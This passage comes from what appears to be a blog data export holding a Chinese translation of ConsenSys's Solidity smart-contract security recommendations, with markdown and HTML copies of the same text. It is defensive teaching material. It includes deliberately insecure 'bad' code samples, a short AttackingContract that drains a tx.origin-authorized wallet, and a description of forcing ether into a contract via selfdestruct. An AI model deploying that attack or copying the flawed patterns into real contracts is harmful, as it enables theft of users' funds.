[http://btcrelay.org](http://btcrelay.org) 来验证），散列提交揭示方案（即一方产生一个数字，将其散列值发布为”提交“的值，然后揭示这个数）和 [RANDAO](https://github.com/randao/randao)\n* 如果你正在实现一个频繁的批量拍卖，哈希提交方案也很合适。\n\n### 注意在双方或者多方合约中，一些成员可能”掉线“，没有返回\n\n不要只依赖于特定方执行特定行动的退款或者索赔流程，而没有其他获得资金的方式。比如，在剪刀石头布游戏中，一个常见的错误是在两位玩家提交它们的行动之前，没有进行支付；然而，一个恶意的玩家可以简单地通过不提交他的动作来使得另一位玩家陷入困境 - 实际上，如果一个玩家看到了其他玩家暴露的行为，并且确定他们输了，他们就没有任何理由去提交他们自己的行为。这个问题也可能出现在状态渠道的解决中。当这样的场景变成一个问题，（1）提供一种规避未参与的参与者的方式，可能是通过限制时间，（2）考虑增加额外的经济激励，让参与者在需要提交信息的场景中提交所有该场景需要的信息。\n\n### Solidity 详细建议\n\n下面的建议对于 Solidity 来说十分详细，不过对于使用其他语言来开发智能合约来说，应该也是有所帮助的。\n\n### 强制对不变值使用 `assert()`\n\n当一个断言失败的时候，它的保护机制就会被触发 - 比如当一个不变的属性改变的时候。比如，在一个代币发行合约中，代币与以太币的汇率可能是固定的。然后你可以通过 `assert()` 来验证所有的这种情况。断言保护机制应该经常与其他技术结合，如暂停合约和允许升级。（否则，你可能会陷入停滞，而一个断言总是在失败。）\n\n例子：\n\n```\ncontract Token {\n\tmapping (address => uint) public balanceOf;\n\tuint public totalSupply;\n\n\tfunction deposit() public payable {\n\t\tbalanceOf[msg.sender] += msg.value;\n\t\ttotalSupply += msg.value;\n\t\tassert(this.balance >= totalSupply);\n\t}\n}\n```\n\n注意断言并非对资产严格相等，因为合约可以不通过 `deposit` 函数强制[发送以太币](https://consensys.github.io/smart-contract-best-practices/recommendations/#ether-forcibly-sent)\n\n### 正确地使用 `assert()` 和 `require()`\n\n在 Solidity 0.4.10 中，引入了 `assert()` 和 `require()`。`require(condition)` 被用来对用户的任何输入进行验证，如果条件不成立则回滚。`assert(condition)` 在条件不成立时也会回滚，但是只用在不变值上：内部错误或者检查你的合约是否是非法的状态。遵循这种范式将允许形式分析工具来进行验证工作，而非法的操作码永远不会到达：这意味着代码中的任何不变值都不会被违反，并且代码正确地验证。\n\n### 小心整数除法\n\n所有整数除法都被向下取整。如果你需要更高的精度，考虑使用乘数，或者存储分子和分母。\n\n（在未来，Solidity 会有定点类型，这会使得整数除法更容易。）\n\n```\n// bad\nuint x = 5 / 2; // Result is 2, all integer divison rounds DOWN to the nearest integer\n```\n\n使用乘数来防止向下取整，当使用 x 的时候要考虑到这个乘数：\n\n```\n// good\nuint multiplier = 10;\nuint x = (5 * multipler) / 2;\n```\n\n存储分子和分母意味着你可以离链计算分子除以分母的结果。\n\n```\n// good\nuint numerator = 5;\nuint denominator = 2;\n```\n\n### 记住以太币可以被强制发送到一个账户\n\n注意对严格检查了的合约的余额进行编码。\n\n一个攻击者可以强制对任何账户发送 wei，而且这不能被阻止（即使是使用了 `revert()` 的 fallback 函数也不可以）\n\n攻击者通过创余额为 1 wei 的合约，然后通过 `selfdestruct(victimAddress)` 的方式达到目的。`victimAddress` 中没有代码被激活，所以这不能被阻止。\n\n### 注意抽象合约和接口的平衡\n\n接口和抽象合约都为智能合约提供了一种定制的，可复用的方式。接口，在 Solidity 0.4.11 中被引入，与抽象合约十分相似，但是接口不能有已经实现的方法。接口同样也有限制，它不能访问存储，不能继承其他接口，而这通常使得抽象合约更加实用。虽然，接口实际上对设计合约的实现上十分有用。另外，十分重要的是如果一个合约继承了一个抽象合约，那它必须通过重写来实现所有抽象合约中未实现的函数，否则它依旧是一个抽象合约。\n\n### 保持 fallback 函数简单\n\n当一个合约发送了没有参数（或者当没有函数匹配上的时候）的消息时，[Fallback 函数](https://solidity.readthedocs.io/en/latest/contracts.html#fallback-function) 会被调用，而且如果通过 `.send()` 或者 `.transfer()` 调用的话只需要 2300 单位的燃料。如果你希望能够从 `.send()` 或者 `.transfer()` 接受以太币，你能做的就是在 fallback 函数中记录一个日志。如果需要计算，或者更多的燃料，就使用一个真正的函数。\n\n```\n// bad\nfunciton() payable { balances[msg.sender] += msg.value; }\n\n// good\nfunction deposit() payable external { balances[msg.sender] += msg.value; }\n\nfunction() payable { LogDepositReceived(msg.sender); }\n```\n\n### 为函数和状态变量显式标记可见性\n\n显式标记函数和状态变量的可见性。函数可以被指定为 `external / public / internal / private`。请理解它们之间的区别，比如，比起 `public`，`external` 可能已经足够使用了。对于状态变量来说，`external` 是不可能的。显式标记可见性将更容易捕捉有关谁可以调用函数或访问变量的错误假设。 \n\n```\n// bad\nuint x; // the default is internal for state variables, but it should be made explicit\nfunction buy() { // the default is public \n\t\t// public code\n}\n\n// good\nuint private y;\nfunction buy() external {\n\t\t// only callable external\n}\n\nfunction utility() public {\n\t\t// callable externally, as well as internally: changing this code requires thinking about both cases\n}\n\nfunction internalAction() internal {\n\t\t// internal code\n}\n```\n\n### 锁定指定编译器版本的编译指示\n\n应该使用相同的编译器版本部署合同，并标记它们已经经过了足够的测试。锁定编译指示可以帮助确保合约不会意外部署，比如，最新的编译器对未知错误有更高的风险。合约也可能由其他人部署，通过编译指示就知道原作者打算使用的编译器版本。\n\n```\n// bad \npragma solidity ^0.4.4;\n\n// good\npragma solidity 0.4.0;\n```\n\n#### 异常\n\n当合约打算供其他开发人员使用时，可以允许 `pragma` 语句浮动，例如类库或者 EthPM 包。否则，开发人员为了在本地编译就需要手动更新编译指示。\n\n### 函数和事件的区别\n\n对事件名首字母大写,以及添加作用前缀，来防止对函数和事件产生困惑。对于方法来说，总是以小写字母开头，除了构造函数之外。\n\n```\n// bad \nevent Transfer() {}\nfunction transfer() {}\n\n// good\nevent LogTransfer() {}\nfunction transfer() external {}\n```\n\n### 推荐使用更新的 Solidity 结构\n\n使用构造/别名如 `selfdestruct` （而不是 `suicide`），和 `keccak256` （而不是 `sha3`）。`require(msg.sender.send(1 ether))` 也可以使用 `transfer()` 简单地实现： `msg.sender.transfer(1 ether)`。\n\n### 注意内置函数可以被覆盖\n\n目前可以在 Solidity 覆盖（[shadow](https://en.wikipedia.org/wiki/Variable_shadowing)）内置的全局变量。它允许合约重写覆盖内置的方法，如 `msg` 和 `revert()`。尽管这是[故意](https://github.com/ethereum/solidity/issues/1249)的，但是它可能会在关于合约的真实行为上误导合约的用户。\n\n```\ncontract PretendingToRevert {\n\tfunction revert() internal constant {}\n}\n\ncontract ExampleContract is PretendingToRevert {\n\tfunction somethingBad() public {\n\t\trevert();\n\t}\n}\n```\n\n合约用户（和审计人员）应该注意他们想要使用的应用的所有合约源代码。\n\n### 避免使用 `tx.origin`\n\n永远不要使用 `tx.origin` 进行授权，另一个合约可以有一种方法来调用你的合约（比如用户有一些资金），而因为你的地址在 `tx.origin` 里面，你的合约就会授权该交易。\n\n```\npragma solidity ^0.4.18;\n\ncontract MyContract {\n\taddress owner;\n\n\tfunction MyContract() public {\n\t\towner = msg.sender;\n\t}\n\n\tfunction sendTo(address receiver, uint amount) public {\n\t\trequire(tx.origin == owner);\n\t\treceiver.transfer(amount);\n\t}\n}\n\ncontract AttackingContract {\n\tMyContract myContract;\n\taddress attacker;\n\n\tfunction AttackingContract(address myContractAddress) public {\n\t\tmyContract = MyContract(myContractAddress);\n\t\tattacker = msg.sender;\n\t}\n\n\tfunction() public {\n\t\tmyContract.sendTo(attacker, msg.sender.balance);\n\t}\n}\n```\n\n你应该使用 `msg.sender` 来授权（如果有另一个合约调用了你的合约，`msg.sender` 会成为合约的地址，而且不是调用合约的人的地址）。\n\n更多可见 [Solidity 文档](https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin)\n\n除了授权的这个问题，`tx.origin` 可能在将来从以太坊协议中移除，所以使用了 `tx.origin` 的代码在将来不会再被兼容 [Vitalik: 'Do NOT assume that tx.origin will continue to be usable or meaningful.'](https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof/200#200)\n\n另外值得一提的是，通过使用 `tx.origin`，你会限制合同之间的互操作性，因为使用 `tx.origin` 的合同不能被另一个合同使用，因为合同不能是 `tx.origin`。\n\n### 时间戳依赖\n\n在合同中使用时间戳执行关键功能时有三个主要考虑因素，特别是当涉及到资金转移时。\n\n#### Gameability\n\n注意区块的时间戳是可用被矿工操作的。考虑这个[合约](https://etherscan.io/address/0xcac337492149bdb66b088bf5914bedfbf78ccc18#code)：\n\n```\nuint256 constant private salt = block.timestamp;\n\nfunction random(uint Max) constant private returns (uint256 result) {\n\t//get the best seed for randomness\n\tuint256 x = salt * 100/Max;\n\tuint256 y = salt * block.number/(salt % 5);\n\tuint256 seed = block.number/3 + (salt % 300) + Last_Payout + y;\n\tuint256 h = uint256(block.blockhash(seed));\n\n\treturn uint256((h / x)) % Max + 1; // random number between 1 and Max\n}\n```\n\n当合约使用时间戳来产生随机数时，矿工实际上可以在被验证块的 30 秒内发布时间戳，从而有效地允许矿工预先计算一个更有利于他们抽奖机会的选项。 时间戳不是随机的，不应该在这种情况下使用。\n\n#### 30 秒规则\n\n评估时间戳使用的一般经验法则是：\n\n**如果合约功能可以容忍30秒的时间漂移，则可以安全使用 `block.timestamp`**\n\n如果您的时间相关事件的比例可以变化 30 秒并保持完整性，则使用时间戳是安全的。 这包括拍卖结束，注册期限等事情。\n\n#### 将 `block.number` 作为时间戳使用时要当心\n\n当合约创建一个 `auction_complete` 修饰器来表示代币销售的结束，像[这样](https://consensys.github.io/smart-contract-best-practices/(https://github.com/SpankChain/old-sc_auction/blob/master/contracts/Auction.sol))\n\n```\nmodifier auction_complete {\n\trequire(auctionEndBlock <= block.number ||\n\t\tcurrentAuctionState == AuctionState.success ||\n\t\tcurrentAuctionState == AuctionState.cancel)\n\t\t_;\n}\n```\n\n`block.number` 和 [平均出块时间](https://etherscan.io/chart/blocktime) 也可以用来估算时间，但是这不是未来的证明，因为区块时间可以修改（例如 [分叉重组](https://blog.ethereum.org/2015/08/08/chain-reorganisation-depth-expectations/) 和 [难度炸弹](https://github.com/ethereum/EIPs/issues/649)）。在一天的销售中，12分钟规则允许人们构建更可靠的时间估计。\n\n### 弃用/历史 建议\n\n由于协议的修改或者 solidity 的提升，这些建议不再相关。They are recorded here for posterity and awareness.\n\n#### 注意被 0 除 （Solidity < 0.4）\n\n在版本 0.4 之前，当一个数字除以 0 时，Solidity 会返回零，并且不会引发异常。 确保你至少运行 0.4 版本。\n","slug":"智能合约最佳实践翻译二","published":1,"updated":"2018-03-15T11:03:13.845Z","layout":"post","photos":[],"link":"","_id":"cjf7piavt001apkwo7vmq7dpu","content":"<p><a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/\" target=\"_blank\" rel=\"noopener\">原文链接</a></p>\n<h2 id=\"对-Solidity-中的智能合约的安全推荐-Recommendations-for-Smart-Contract-Security-in-Solidity\"><a href=\"#对-Solidity-中的智能合约的安全推荐-Recommendations-for-Smart-Contract-Security-in-Solidity\" class=\"headerlink\" title=\"对 Solidity 中的智能合约的安全推荐 Recommendations for Smart Contract Security in Solidity\"></a>对 Solidity 中的智能合约的安全推荐 Recommendations for Smart Contract Security in Solidity</h2><p>本页面展示了编写智能合约时应遵循的一些 solidity 模式。</p>\n<h3 id=\"协议具体建议\"><a href=\"#协议具体建议\" class=\"headerlink\" title=\"协议具体建议\"></a>协议具体建议</h3><p>以下建议适用于以太坊中所有的智能合约的开发。</p>\n<h3 id=\"外部调用\"><a href=\"#外部调用\" class=\"headerlink\" title=\"外部调用\"></a>外部调用</h3><h4 id=\"小心使用外部调用\"><a href=\"#小心使用外部调用\" class=\"headerlink\" title=\"小心使用外部调用\"></a>小心使用外部调用</h4><p>调用不受信任的合约会引入一些预期外的风险或错误。外部调用可能会在该合约或其依赖的任何其他合约中执行恶意代码。所以每个外部调用都要被当做潜在的安全风险来对待。如果不可能或不希望删除外部调用，请使用本节其余部分的建议来减少危险</p>\n<h4 id=\"标记不受信任的合约\"><a href=\"#标记不受信任的合约\" class=\"headerlink\" title=\"标记不受信任的合约\"></a>标记不受信任的合约</h4><p>当与外部合约交互的时候，通过某种形式命名你的变量，方法和合约接口来清楚地表达其所交互的对象是具有潜在性的安全问题的。这适用于你的调用外部合约的函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">Bank.withdraw(100); // Unclear whether trusted or untrusted</span><br><span class=\"line\"></span><br><span class=\"line\">// Isn&apos;t clear that this function is potentially unsafe</span><br><span class=\"line\">function makeWithdrawal(uint amount)  &#123;</span><br><span class=\"line\">\t\tBank.withdraw(amount);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">UntrustedBank.withdraw(100);</span><br><span class=\"line\">TrustedBank.withdraw(100);</span><br><span class=\"line\"></span><br><span class=\"line\">function makeUntrustedWithdrawal(uint amount) &#123;</span><br><span class=\"line\">\t\tUntrustedBank.withdraw(amount);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"避免在外部调用之后改变状态\"><a href=\"#避免在外部调用之后改变状态\" class=\"headerlink\" title=\"避免在外部调用之后改变状态\"></a>避免在外部调用之后改变状态</h4><p>不论是否使用 <code>raw calls</code>（<code>someAddress,call()</code> 的格式） 或者 <code>contract calls</code>（<code>ExternalContract.someMethod()</code> 的格式），都假定会执行恶意代码。即使 <code>ExternalContract</code> 不是恶意的，但它调用的任何合约也可能会执行恶意代码。</p>\n<p>一个特殊的危险是，恶意代码可能对控制流进行了 <code>hijack</code> 攻击，导致条件竞争。（见 <a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#race-conditions\" target=\"_blank\" rel=\"noopener\">Race Conditions</a> 了解更多关于这个问题的讨论）。</p>\n<p>如果你调用了一个不受信任的外部合约，<em>避免在调用之后改变状态</em>。这个模式也常常作为 <a href=\"https://solidity.readthedocs.io/en/develop/security-considerations.html?highlight=check%20effects#use-the-checks-effects-interactions-pattern\" target=\"_blank\" rel=\"noopener\">check-effects-interactions 模式</a> 为人们所知。</p>\n<h4 id=\"注意-send-transfer-call-value-之间的平衡\"><a href=\"#注意-send-transfer-call-value-之间的平衡\" class=\"headerlink\" title=\"注意 send() / transfer() / call.value() 之间的平衡\"></a>注意 <code>send() / transfer() / call.value()</code> 之间的平衡</h4><p>在发送 ether 时注意 <code>someAddress.send() / someAddress.transfer() / someAddress.call.value()()</code> 之间的使用的关系的平衡。</p>\n<ul>\n<li><code>someAddress.send()</code> 和 <code>someAddress.transfer()</code> 被认为对于<a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#reentrancy\" target=\"_blank\" rel=\"noopener\">重入</a>是安全的。尽管这些方法仍然会触发代码的执行，但是被调用的合约只会被提供 2300 单位的燃料，目前来说，这么多的燃料足够用来记录事件了。</li>\n<li><code>x.transfer(y)</code> 和 <code>require(x.send(y));</code> 的等同的，如果发送失败，它会自动回退。</li>\n<li><code>someAddress.call.value(y)()</code> 会发送提供的以太币，然后触发代码的执行。为执行的代码提供所有可用来执行的燃料使得这种转账方式对于重入来说很不安全。</li>\n</ul>\n<p>使用 <code>send()</code> 和 <code>transfer()</code> 可以防止重入，但是这样的做法会使得与那些 fallback 函数的消耗超过 2300 单位燃料的合约不兼容。也可以使用 <code>someAddress.vall.value(ethAmount).gas(gasAmount)()</code> 来转发指定的燃料数量。</p>\n<p>一个试图平衡这个问题的解决办法是实现 <em><a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-payments\" target=\"_blank\" rel=\"noopener\">退和拉</a></em> 的机制模式， <em>推送</em> 部分使用 <code>send()</code> 或者 <code>transfer()</code> ，<em>拉</em> 部分使用 <code>call.value()</code> 。</p>\n<p>值得指出的是，对于价值转移而言，专用 <code>send()</code> 或者 <code>transfer()</code> 并不能使得合约避免重入的安全问题，但是能够使得一些特定的转账避免重入的安全问题。</p>\n<h4 id=\"解决外部调用的错误\"><a href=\"#解决外部调用的错误\" class=\"headerlink\" title=\"解决外部调用的错误\"></a>解决外部调用的错误</h4><p>Solidity 提供了处理原生地址的底层调用方法：<code>address.call()</code>，<code>address.callcode()</code>，<code>address,delegatecall()</code>，和 <code>address.send()</code>。当调用遇到一个异常的时候，这些底层方法不会抛出一个异常，而是返回一个 <code>false</code>。从另一方面来说，<em>合约调用</em>（如 <code>ExternalContract.doSomething()</code>）会自动传播一个异常（比如，如果 <code>doSomething()</code> 抛出异常，<code>ExternalContract.doSomething()</code> 也会 <code>throw</code>）。</p>\n<p>如果你选择使用底层调用方法，要确定你通过检查返回值，处理了可能存在的调用失败的情况。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">someAddress.send(55);</span><br><span class=\"line\">someAddress.call.value(55)(); // this is doubly dangerous, as it will forward all remaining gas and doesn&apos;t check for result</span><br><span class=\"line\">someAddress.call.value(100)(bytes4(sha3(&quot;deposit()&quot;))); // if deposit throws an exception, the raw call() will only return false and transaction will NOT be reverted</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">if (!someAddress.send(55)) &#123;</span><br><span class=\"line\">\t\t// some failure code</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ExternalContract(someAddress).deposit.value(100);</span><br></pre></td></tr></table></figure>\n<h4 id=\"对外部调用来说，拉比推更好\"><a href=\"#对外部调用来说，拉比推更好\" class=\"headerlink\" title=\"对外部调用来说，拉比推更好\"></a>对外部调用来说，拉比推更好</h4><p>外部调用可能有意无意而失败。为了最小化这样失败带来的破坏，通常最好将每个外部调用隔离到可以由调用接收方发起的自己的交易中。这与支付特别相关，与将资金自动推给用户比起来，更好的是让用户提取资金。（这也减少了<a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-block-gas-limit\" target=\"_blank\" rel=\"noopener\">燃料限制问题</a>。）避免在单个交易中组合多个 <code>send()</code> </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">contract auction &#123;</span><br><span class=\"line\">\taddress highestBidder;</span><br><span class=\"line\">\tuint highestBid;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction bid() payable &#123;</span><br><span class=\"line\">\t\trequire(msg.value &gt;= highestBid);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif (highestBidder != 0) &#123;</span><br><span class=\"line\">\t\t\thighestBidder.transfer(highestBid); // if this call consistently fails, no one else can bid </span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\thighestBidder = msg.sender;</span><br><span class=\"line\">\t\thighestBid = msg.value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">contract auction &#123;</span><br><span class=\"line\">\taddress highestBidder;</span><br><span class=\"line\">\tuint highestBid;</span><br><span class=\"line\">\tmapping(address =&gt; uint) refunds;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction bid() payable external &#123;</span><br><span class=\"line\">\t\trequire(msg.value &gt;= highestBid);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif (highestBidder != 0) &#123;</span><br><span class=\"line\">\t\t\trefunds[highestBidder] += highestBid; // record the refund that this user can claim</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\thighestBidder = msg.sender;</span><br><span class=\"line\">\t\thighestBid = msg.value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction withdrawRefund() external &#123;</span><br><span class=\"line\">\t\tuint refund = refunds[msg.sender];</span><br><span class=\"line\">\t\trefunds[msg.sender] = 0;</span><br><span class=\"line\">\t\tmsg.sender.transfer(refund);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"不要假设合约创建时是-0-资产\"><a href=\"#不要假设合约创建时是-0-资产\" class=\"headerlink\" title=\"不要假设合约创建时是 0 资产\"></a>不要假设合约创建时是 0 资产</h4><p>一个攻击者可以在合约创建之前发送 wei 到合约的地址。合约不应该假设初始状态包含 0 资产。见 <a href=\"https://github.com/ConsenSys/smart-contract-best-practices/issues/61\" target=\"_blank\" rel=\"noopener\">问题 61</a> 查看更多细节。</p>\n<h4 id=\"记住链上的数据是公开的\"><a href=\"#记住链上的数据是公开的\" class=\"headerlink\" title=\"记住链上的数据是公开的\"></a>记住链上的数据是公开的</h4><p>许多应用程序要求提交数据以便在某个时间点可以供其工作。游戏（如链上的石头剪子布）和拍卖机制（如 盲派的第二次出价）是两种主要类别的例子。如果你正在构建一个涉及到隐私的应用，注意不免要求用户过早发布信息。</p>\n<p>示例：</p>\n<ul>\n<li>在石头剪子布中，首先要求两个玩家同时提交他们的出手意图的哈希值，然后再要求提交他们的实际出手，如果匹配不上之前的哈希值，则抛出。</li>\n<li>在一个拍卖中，要求玩家在初始阶段提交他们的出价金额的哈希值（保证金高于他们的竞价），然后在第二阶段提交他们的实际竞价。</li>\n<li>当开发一个依赖于随机数生成器的应用时，顺序应该总是（1）提交行动，（2）生成随机数，（3）玩家付出。随机数生成方法本来就是一个活跃的研究领域；目前同类最佳的解决方案包括比特币区块头（通过 <a href=\"http://btcrelay.org\" target=\"_blank\" rel=\"noopener\">http://btcrelay.org</a> 来验证），散列提交揭示方案（即一方产生一个数字，将其散列值发布为”提交“的值，然后揭示这个数）和 <a href=\"https://github.com/randao/randao\" target=\"_blank\" rel=\"noopener\">RANDAO</a></li>\n<li>如果你正在实现一个频繁的批量拍卖，哈希提交方案也很合适。</li>\n</ul>\n<h3 id=\"注意在双方或者多方合约中，一些成员可能”掉线“，没有返回\"><a href=\"#注意在双方或者多方合约中，一些成员可能”掉线“，没有返回\" class=\"headerlink\" title=\"注意在双方或者多方合约中，一些成员可能”掉线“，没有返回\"></a>注意在双方或者多方合约中，一些成员可能”掉线“，没有返回</h3><p>不要只依赖于特定方执行特定行动的退款或者索赔流程，而没有其他获得资金的方式。比如，在剪刀石头布游戏中，一个常见的错误是在两位玩家提交它们的行动之前，没有进行支付；然而，一个恶意的玩家可以简单地通过不提交他的动作来使得另一位玩家陷入困境 - 实际上，如果一个玩家看到了其他玩家暴露的行为，并且确定他们输了，他们就没有任何理由去提交他们自己的行为。这个问题也可能出现在状态渠道的解决中。当这样的场景变成一个问题，（1）提供一种规避未参与的参与者的方式，可能是通过限制时间，（2）考虑增加额外的经济激励，让参与者在需要提交信息的场景中提交所有该场景需要的信息。</p>\n<h3 id=\"Solidity-详细建议\"><a href=\"#Solidity-详细建议\" class=\"headerlink\" title=\"Solidity 详细建议\"></a>Solidity 详细建议</h3><p>下面的建议对于 Solidity 来说十分详细，不过对于使用其他语言来开发智能合约来说，应该也是有所帮助的。</p>\n<h3 id=\"强制对不变值使用-assert\"><a href=\"#强制对不变值使用-assert\" class=\"headerlink\" title=\"强制对不变值使用 assert()\"></a>强制对不变值使用 <code>assert()</code></h3><p>当一个断言失败的时候，它的保护机制就会被触发 - 比如当一个不变的属性改变的时候。比如，在一个代币发行合约中，代币与以太币的汇率可能是固定的。然后你可以通过 <code>assert()</code> 来验证所有的这种情况。断言保护机制应该经常与其他技术结合，如暂停合约和允许升级。（否则，你可能会陷入停滞，而一个断言总是在失败。）</p>\n<p>例子：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Token &#123;</span><br><span class=\"line\">\tmapping (address =&gt; uint) public balanceOf;</span><br><span class=\"line\">\tuint public totalSupply;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction deposit() public payable &#123;</span><br><span class=\"line\">\t\tbalanceOf[msg.sender] += msg.value;</span><br><span class=\"line\">\t\ttotalSupply += msg.value;</span><br><span class=\"line\">\t\tassert(this.balance &gt;= totalSupply);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注意断言并非对资产严格相等，因为合约可以不通过 <code>deposit</code> 函数强制<a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#ether-forcibly-sent\" target=\"_blank\" rel=\"noopener\">发送以太币</a></p>\n<h3 id=\"正确地使用-assert-和-require\"><a href=\"#正确地使用-assert-和-require\" class=\"headerlink\" title=\"正确地使用 assert() 和 require()\"></a>正确地使用 <code>assert()</code> 和 <code>require()</code></h3><p>在 Solidity 0.4.10 中，引入了 <code>assert()</code> 和 <code>require()</code>。<code>require(condition)</code> 被用来对用户的任何输入进行验证，如果条件不成立则回滚。<code>assert(condition)</code> 在条件不成立时也会回滚，但是只用在不变值上：内部错误或者检查你的合约是否是非法的状态。遵循这种范式将允许形式分析工具来进行验证工作，而非法的操作码永远不会到达：这意味着代码中的任何不变值都不会被违反，并且代码正确地验证。</p>\n<h3 id=\"小心整数除法\"><a href=\"#小心整数除法\" class=\"headerlink\" title=\"小心整数除法\"></a>小心整数除法</h3><p>所有整数除法都被向下取整。如果你需要更高的精度，考虑使用乘数，或者存储分子和分母。</p>\n<p>（在未来，Solidity 会有定点类型，这会使得整数除法更容易。）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">uint x = 5 / 2; // Result is 2, all integer divison rounds DOWN to the nearest integer</span><br></pre></td></tr></table></figure>\n<p>使用乘数来防止向下取整，当使用 x 的时候要考虑到这个乘数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// good</span><br><span class=\"line\">uint multiplier = 10;</span><br><span class=\"line\">uint x = (5 * multipler) / 2;</span><br></pre></td></tr></table></figure>\n<p>存储分子和分母意味着你可以离链计算分子除以分母的结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// good</span><br><span class=\"line\">uint numerator = 5;</span><br><span class=\"line\">uint denominator = 2;</span><br></pre></td></tr></table></figure>\n<h3 id=\"记住以太币可以被强制发送到一个账户\"><a href=\"#记住以太币可以被强制发送到一个账户\" class=\"headerlink\" title=\"记住以太币可以被强制发送到一个账户\"></a>记住以太币可以被强制发送到一个账户</h3><p>注意对严格检查了的合约的余额进行编码。</p>\n<p>一个攻击者可以强制对任何账户发送 wei，而且这不能被阻止（即使是使用了 <code>revert()</code> 的 fallback 函数也不可以）</p>\n<p>攻击者通过创余额为 1 wei 的合约，然后通过 <code>selfdestruct(victimAddress)</code> 的方式达到目的。<code>victimAddress</code> 中没有代码被激活，所以这不能被阻止。</p>\n<h3 id=\"注意抽象合约和接口的平衡\"><a href=\"#注意抽象合约和接口的平衡\" class=\"headerlink\" title=\"注意抽象合约和接口的平衡\"></a>注意抽象合约和接口的平衡</h3><p>接口和抽象合约都为智能合约提供了一种定制的，可复用的方式。接口，在 Solidity 0.4.11 